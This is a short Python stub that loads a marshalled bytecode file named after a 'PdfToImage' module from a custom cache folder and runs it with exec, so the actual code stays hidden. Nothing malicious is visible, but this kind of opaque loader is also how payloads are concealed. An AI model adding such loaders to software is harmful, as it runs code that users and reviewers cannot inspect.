
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfToImage_959bec7eafaa475cb26f36b7746a6047.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
